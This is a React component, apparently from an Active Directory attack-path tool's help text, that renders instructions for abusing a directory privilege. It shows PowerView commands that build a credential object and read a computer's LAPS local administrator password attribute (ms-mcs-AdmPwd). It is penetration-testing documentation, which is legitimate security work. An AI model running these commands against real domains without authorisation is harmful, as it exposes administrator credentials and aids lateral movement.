import React from 'react';
import PropTypes from 'prop-types';

const WindowsAbuse = ({ sourceName, sourceType }) => {
    return (
        <>
            <p>
                To abuse this privilege with PowerView's Get-DomainObject, first
                import PowerView into your agent session or into a PowerShell
                instance at the console. You may need to authenticate to the
                Domain Controller as{' '}
                {sourceType === 'User'
                    ? `${sourceName} if you are not running a process as that user`
                    : `a member of ${sourceName} if you are not running a process as a member`}
                . To do this in conjunction with Get-DomainObject, first create
                a PSCredential object (these examples comes from the PowerView
                help documentation):
            </p>

            <pre>
                <code>
                    {"$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n" +
                        "$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)"}
                </code>
            </pre>

            <p>
                Then, use Get-DomainObject, optionally specifying $Cred if you
                are not already running a process as {sourceName}:
            </p>

            <pre>
                <code>
                    {
                        'Get-DomainObject windows1 -Credential $Cred -Properties "ms-mcs-AdmPwd",name'
                    }
                </code>
            </pre>
        </>
    );
};

WindowsAbuse.propTypes = {
    sourceName: PropTypes.string,
    sourceType: PropTypes.string,
};

export default WindowsAbuse;
